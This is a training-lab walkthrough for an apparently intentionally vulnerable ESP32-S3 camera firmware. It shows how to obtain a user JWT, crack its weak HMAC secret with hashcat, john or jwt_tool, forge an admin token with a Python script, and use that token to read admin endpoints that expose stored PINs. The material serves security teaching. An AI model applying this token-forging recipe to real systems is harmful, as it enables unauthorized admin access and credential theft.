# L10: Weak JWT Secret

## Goal
Crack weak JWT secret and forge admin tokens to gain unauthorized admin access.

## Background

**Why this matters**: JWT authentication with weak secrets allows attackers to forge valid tokens and impersonate any user, including administrators.

**What you're looking for in IoT devices:**
- JWT authentication in web APIs or mobile apps
- Weak, guessable, or hardcoded signing secrets
- Default secrets unchanged from framework defaults

**Why this happens:**
- Developers use simple secrets (`secret`, `password`, `changeme`)
- Framework defaults not changed (`your-256-bit-secret`, `changeme`)
- Secrets hardcoded in source code; no key rotation policy

**On CoreS3**: The firmware uses a weak HMAC-SHA256 secret to sign JWTs. `POST /login` returns a JWT with `user` and `role` claims. The secret is hardcoded and never rotated. Admin endpoints (`/admin/status`, `/admin/nvs`, `/admin-panel`, `/settings`) check for `role: "admin"`.

```cpp
// From CameraDevice_Auth.cpp - JWT signing
String signatureInput = encodedHeader + "." + encodedPayload;
String signature = hmacSha256(signatureInput, jwtSecret);
// jwtSecret is hardcoded: jwtSecret = "secret123"
// Same key used for ALL token signing - no rotation, no per-session keys
```

**JWT structure:**
```
header.payload.signature

Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"user":"user","role":"user","exp":1234567890}
Signature: HMAC-SHA256(base64url(header) + "." + base64url(payload), jwtSecret)
```

**Finding JWT implementations:**

1. **Identify JWT usage** - look for `Authorization: Bearer eyJhbGc...` headers, cookies, or local storage entries
2. **Decode JWT** - use jwt.io or `echo "eyJhbGc..." | base64 -d`; check algorithm and claims
3. **Test for weak secrets** - try common values, use `hashcat -m 16500`, or `john --wordlist=rockyou.txt`
4. **Common JWT vulnerabilities** - weak secret, algorithm confusion (RS256->HS256), `alg: none`, key injection via `jwk` header

## Lab Walkthrough

### Step 1: Obtain a Valid JWT Token

Authenticate as a regular user to get a signed JWT for offline cracking.

```bash
# Connect to device AP: CoreS3-CAM-XXXX (open), IP 192.168.4.1

# Login as regular user
curl -v -X POST http://192.168.4.1/login \
  -d "username=user&password=CoreS3_User_2024"

# Expected response:
# < HTTP/1.1 200 OK
# < X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxMjM0NTY3ODkwfQ.SIGNATURE_HERE
# <
# Login successful (user)
#
# Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

```bash
# Save the token for cracking
TOKEN=$(curl -s -X POST http://192.168.4.1/login \
  -d "username=user&password=CoreS3_User_2024" | grep "Token:" | awk '{print $2}')

echo "$TOKEN"
```

### Step 2: Decode and Inspect the JWT

Decode the header and payload (base64url-encoded JSON) to identify the algorithm and claims.

```bash
# Decode header
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo
# {"alg":"HS256","typ":"JWT"}

# Decode payload
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
# {"user":"user","role":"user","exp":1234567890}

# Key observations:
# - HS256 = symmetric key, crackable offline
# - "role":"user" - change to "admin" after cracking
# - "exp" = millis since boot + 1 hour
```

You can also paste the token at [https://jwt.io](https://jwt.io) to decode it visually.

### Step 3: Crack the JWT Secret

Use hashcat (mode 16500) or john to brute-force the HMAC-SHA256 secret offline.

```bash
echo "$TOKEN" > jwt.txt

# Method 1: hashcat (GPU-accelerated)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# Secret found! (in seconds - it's in every common wordlist)

# Method 2: john the ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt

# Method 3: jwt_tool
python3 jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt
```

Save the cracked secret - you'll use it in the next step to forge admin tokens.

### Step 4: Forge an Admin Token

Create a new JWT with `role: "admin"` signed with the cracked secret.

```bash
# Using Python (no external tools needed)
python3 -c "
import hmac, hashlib, base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = b64url(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
payload = b64url(json.dumps({'user':'admin','role':'admin','exp':9999999999}).encode())
SECRET = 'YOUR_CRACKED_SECRET'  # Replace with the secret you cracked in Step 3
sig = b64url(hmac.new(SECRET.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest())
print(f'{header}.{payload}.{sig}')
"

# Or use jwt_tool:
python3 jwt_tool.py "$TOKEN" -S hs256 -p 'YOUR_CRACKED_SECRET' \
  -I -pc user -pv admin \
  -I -pc role -pv admin

# Or use jwt.io: paste token, change role to admin, enter the cracked secret

ADMIN_TOKEN="<paste_your_forged_token_here>"
```

### Step 5: Access Admin Endpoints with Forged Token

Use the forged JWT to access protected admin endpoints, proving full admin access without knowing the admin password.

```bash
# Admin status
curl -s http://192.168.4.1/admin/status \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool

# Expected:
{
    "device_id": "XXXXXXXXXXXX",
    "version": "1.0.0",
    "build": "debug",
    "firmware": "1.0.0",
    "ip_address": "192.168.4.1",
    "camera_initialized": true,
    "admin_mode": true,
    "uptime": 1234,
    "free_heap": 245760,
    "free_psram": 8000000
}
```

```bash
# Admin NVS - dumps stored credentials
curl -s http://192.168.4.1/admin/nvs \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool

# Expected:
{
    "wifi_ssid": "YourNetwork",
    "wifi_pass_masked": "***",
    "user_pin": "XXXXXX",
    "admin_pin": "YYYYYY"
}
```

```bash
# Admin panel (HTML)
curl -s http://192.168.4.1/admin-panel \
  -H "Authorization: Bearer $ADMIN_TOKEN" | head -5

# Settings page
curl -s http://192.168.4.1/settings \
  -H "Authorization: Bearer $ADMIN_TOKEN" | head -5
```

### Step 6: Compare with Legitimate Admin Login

Verify that the forged token is indistinguishable from a real admin token.

```bash
curl -s -X POST http://192.168.4.1/login \
  -d 'username=admin&password=CoreS3_Admin_2024!'

# Both tokens work identically - the device cannot tell them apart
# because verifyJWT() only checks the HMAC signature
```

## Impact

- **JWT secret cracked offline** in seconds using hashcat mode 16500 against rockyou.txt
- **Admin token forged without credentials** - no need to know the admin password
- **Full admin access** to `/admin/status`, `/admin/nvs`, `/admin-panel`, `/settings`
- **Credential extraction** via `/admin/nvs` (user PIN, admin PIN, WiFi SSID)
- **No detection** - device cannot distinguish forged tokens from legitimate ones
- **Persistent access** - attacker forges tokens at will; secret never rotates
- **ESP32-S3 specific** - no secure element or hardware key storage; secret extractable via firmware dump or SPI flash read

## References

- [JWT.io - JSON Web Tokens](https://jwt.io/)
- [RFC 7519 - JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [jwt_tool - JWT Testing Tool](https://github.com/ticarpi/jwt_tool)
- [Hashcat - JWT Cracking (mode 16500)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [ESP32-S3 Flash Encryption](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/security/flash-encryption.html)
- [CWE-321: Use of Hard-coded Cryptographic Key](https://cwe.mitre.org/data/definitions/321.html)
